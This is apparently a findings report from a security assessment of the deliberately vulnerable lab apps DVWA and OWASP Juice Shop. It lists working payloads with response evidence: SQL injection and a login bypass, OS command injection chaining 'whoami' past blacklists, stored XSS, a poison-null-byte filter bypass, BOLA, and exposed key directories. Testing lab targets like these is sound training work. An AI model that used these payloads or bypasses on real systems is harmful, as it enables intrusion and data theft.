findings.title: SQL Injection via 'id' parameter in DVWA SQLi page [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 user records (dumping entire users table): First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload id=1' AND '1'='2 returned zero records ('User ID:' with no pre_blocks / no First name/Surname entries). This confirms the quoted boolean injection alters the underlying SQL query and bypasses the intended single-row lookup, classic CWE-89 SQL Injection at DVWA low security.

findings.title: OS Command Injection via 'ip' parameter in DVWA Command Injection page [security=low]
findings.response_evidence: [security=low] Response output included normal ping output for 127.0.0.1 (4 packets, 0% packet loss) followed directly by the literal string 'www-data' appended after the ping statistics block, which is the output of the injected 'whoami' command executed as the web server process identity. This confirms the ';' delimiter allows arbitrary OS command injection chained after the ping command at DVWA low security.

findings.title: Stored Cross-Site Scripting via 'mtxMessage' field in DVWA Guestbook [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin) form_data={txtName: 'tester', mtxMessage: '<script id="test_token">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'}
findings.response_evidence: [security=low] After submitting the canary payload (29 chars, within mtxMessage maxlength=50) with no HTML/script sanitization applied by DVWA low security, the guestbook page rendered the stored entry and executed the injected script on subsequent page load. Behavioral proof: browser_eval_js('window.xss_flag') returned 1, and browser_read_dom('#test_token') confirmed the injected <script id="test_token"> element is present in the live DOM with inner_text 'window.xss_flag=1'. This proves the payload was persistently stored and executed client-side on every visit to /vulnerabilities/xss_s/, confirming Stored XSS (CWE-79) at DVWA low security.

findings.title: SQL Injection via numeric boolean payload in POST id parameter (DVWA medium security)
request_sequence: POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} (session=dvwa_admin)
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} (session=dvwa_admin)
findings.response_evidence:
[security=medium] Confirmed page banner shows "Security Level: medium" and id field is rendered as a <select> dropdown in the HTML form, consistent with medium-level markup, yet raw POST body still accepted arbitrary numeric id value bypassing the dropdown constraint.

TRUE payload id=1 OR 1=1 returned 5 records (all seeded users): 
"ID: 1 OR 1=1 First name: admin Surname: admin", "ID: 1 OR 1=1 First name: Gordon Surname: Brown", "ID: 1 OR 1=1 First name: Hack Surname: Me", "ID: 1 OR 1=1 First name: Pablo Surname: Picasso", "ID: 1 OR 1=1 First name: Bob Surname: Smith"

FALSE payload id=1 AND 1=2 returned zero records - the response visible_text contained only "User ID: 1 2 3 4 5" (the dropdown labels) with no "ID:" result rows and no pre_blocks present.

This confirms unescaped numeric injection into the SQL query at medium security (quote-based payloads are blocked by mysqli_real_escape_string, but numeric boolean injection bypasses this entirely).

findings.title: OS Command Injection via pipe bypass of ';'/'&&' blacklist in ip parameter (DVWA medium security)
request_sequence: POST http://dvwa/vulnerabilities/exec/ with form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'} (session=dvwa_admin)
findings.response_evidence: [security=medium] Confirmed page banner shows "Security Level: medium". Payload ip=127.0.0.1| whoami (pipe character, not blacklisted ';' or '&&') was submitted. Response visible_text included: "Vulnerability: Command Injection ... Enter an IP address: www-data" and pre_blocks returned exactly ["www-data"], proving the whoami command executed server-side and returned the web-process identity www-data, confirming the pipe-based bypass of the medium-level blacklist filter (which only strips literal ';' and '&&' substrings via str_replace).

findings.title: SQL Injection via out-of-band session-input.php (DVWA, high security)
findings.response_evidence:
[security=high] Page banner confirms 'Security Level: high'. At high security the id is submitted out-of-band via session-input.php (GET /vulnerabilities/sqli/ shows only a 'Click here to change your ID' link, no inline form) and the backend query appends LIMIT 1, requiring a trailing comment to neutralize it.

TRUE payload id=1' OR '1'='1' # produced 5 seeded user records on subsequent GET /vulnerabilities/sqli/:
  ID: 1' OR '1'='1' # First name: admin Surname: admin
  ID: 1' OR '1'='1' # First name: Gordon Surname: Brown
  ID: 1' OR '1'='1' # First name: Hack Surname: Me
  ID: 1' OR '1'='1' # First name: Pablo Surname: Picasso
  ID: 1' OR '1'='1' # First name: Bob Surname: Smith

FALSE control payload id=1' AND '1'='2' # produced zero records on subsequent GET /vulnerabilities/sqli/ (no 'First name/Surname' pre_blocks present, only the 'Click here to change your ID' link).

This differential TRUE(5 rows)/FALSE(0 rows) behavior with quote/comment injection confirms boolean-based SQL injection bypassing the high-security defenses (quoting + LIMIT 1 + session-based out-of-band submission).

findings.title: OS Command Injection via pipe (no trailing space) bypassing high-security blacklist (DVWA)
findings.response_evidence: [security=high] Page banner confirms 'Security Level: high'. Payload ip=127.0.0.1|whoami (pipe immediately followed by command, no trailing space, bypassing the high-security blacklist of '; ', '| ' (pipe+space), and '&&') was submitted via POST. The response's visible_text and pre_blocks included the literal output 'www-data', proving successful execution of the injected 'whoami' command under the web server process identity. Full relevant excerpt: "Vulnerability: Command Injection ... Enter an IP address: www-data More Information ... Security Level: high". pre_blocks: ["www-data"].

findings.title: Cross-User Basket Access (BOLA) - acct2 can read acct1's basket
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (baseline, own_basket_id=6) -> returned UserId:22, Products:[Apple Juice (1000ml) qty:3, BasketItem id:9]
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7, different account) -> HTTP 200
findings.response_evidence: Authenticated as juiceshop_acct2 (own_basket_id=7), requested GET /rest/basket/6 (acct1's basket, UserId:22). Response HTTP 200: {"status":"success","data":{"id":6,"coupon":null,"UserId":22,"createdAt":"2026-11-13T11:04:24.020Z","updatedAt":"2026-11-13T11:04:24.020Z","Products":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3,...}}]}}. This matches acct1's exact seeded item (Apple Juice 1000ml, qty 3, BasketItem id 9) and UserId 22 (not acct2's own UserId), proving no ownership/authorization check is enforced on this endpoint - a clear BOLA/IDOR vulnerability.

findings.title: Authentication Bypass via SQL Injection on login endpoint
findings.response_evidence: Response HTTP 200: {"authentication":{"token":"[JWT present]","bid":1,"umail":"admin@juice-sh.op"}}. The SQLi payload email=' OR 1=1-- caused the backend SQL query (SELECT * FROM Users WHERE email='<input>' AND password=[REDACTED] to effectively become 'WHERE email='' OR 1=1--...' which matches all rows; the first row returned (and thus the authenticated user) is umail=admin@juice-sh.op (the first seeded user), with bid (basket id) = 1, and a valid signed JWT was issued without knowing admin's real password. This confirms a successful authentication bypass via SQL injection.

findings.title: SQL Injection in Product Search (error-based + UNION-based)
findings.response_evidence: Request 1 (single quote q=qwert') returned HTTP 500 with body: \"Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error OWASP Juice Shop (Express ^4.17.1) 500 Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error\" - proving the raw input is concatenated unsanitized into a SQL query and breaks query syntax, confirming SQL injection. Request 2 (UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--) returned HTTP 200 with body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} - the literal integer values 1-9 appearing in place of normal product fields (name=2, description=3 etc.) proves the 9-column UNION SELECT was successfully injected and executed by the backend, confirming exploitable SQL injection in the search parameter.

findings.title: Open Directory Listing on /ftp/ Exposes Confidential Acquisitions Memo
findings.response_evidence:
Step 1: GET /ftp/ with Accept: text/html,application/json returned HTTP 200 with a browsable directory listing (serve-index) including the entry 'acquisitions.md 909 12/19/2023 1:12:12 PM' among other files (announcement_encrypted.md, coupons_2013.md.bak, incident-support.kdbx, package.json.bak, etc.), and a direct hyperlink http://juiceshop:3000/ftp/acquisitions.md.

Step 2: GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with body beginning:
'# Planned Acquisitions\n\n> This document is confidential! Do not distribute!\n\nOur company plans to acquire several competitors within the next year.\nThis will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.'

This confirms unauthenticated disclosure of a confidential internal M&A memo via an open, browsable directory listing — CWE-200 Information Exposure.

findings.title: Poison Null Byte Path Traversal Bypasses .bak Extension Filter on /ftp/
findings.response_evidence:
Step 1: GET /ftp/package.json.bak returned HTTP 403 with body: 'Error: Only .md and .pdf files are allowed!' (thrown from fileServer.js:55 verify function) — confirming the raw .bak extension is blocked by the server-side extension whitelist filter.

Step 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte '%2500' followed by allowed '.md' extension) returned HTTP 200, content-type application/octet-stream, with body containing the full restricted package.json contents:
'{\n  "name": "juice-shop",\n  "version": "6.2.0-SNAPSHOT",\n  "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...} ...'

This demonstrates that appending a URL-encoded null byte plus an allowed extension bypasses the extension-check filter (classic poison null byte / path traversal, CWE-22), returning the content of the restricted .bak file that was explicitly denied by direct request.

findings.title: Unauthenticated access to /api/Feedbacks discloses user PII (email addresses) in feedback comments
request_sequence: GET http://juiceshop:3000/api/Feedbacks (no Authorization header, unauth session)
findings.response_evidence: HTTP 200 JSON returned without any authentication. Response body contains feedback records whose 'comment' field embeds the submitting user's email address (partially redacted by the app but still exposing domain and trailing characters), e.g.: comment=\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\", UserId=1, id=1; comment=\"Great shop! Awesome service! (***@juice-sh.op)\", UserId=2; comment=\"Nothing useful available here! (***der@juice-sh.op)\", UserId=3; comment=\"Please send me the juicy chatbot NFT ... (***ereum@juice-sh.op)\", UserId=21. This confirms the unauthenticated endpoint discloses PII (email address fragments tied to specific UserId records) without requiring any session/Authorization header.

findings.title: Exposed /encryptionkeys/ directory listing discloses sensitive key files (jwt.pub, premium.key)
findings.response_evidence: HTTP 200 returned for directory listing at /encryptionkeys/ with no authentication required. The rendered directory listing (visible_text) explicitly shows: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Discovered links confirm direct file URLs: http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This confirms the encryption keys directory is browsable and exposes sensitive key filenames (jwt.pub - JWT public key, premium.key - premium feature encryption key) to unauthenticated users.
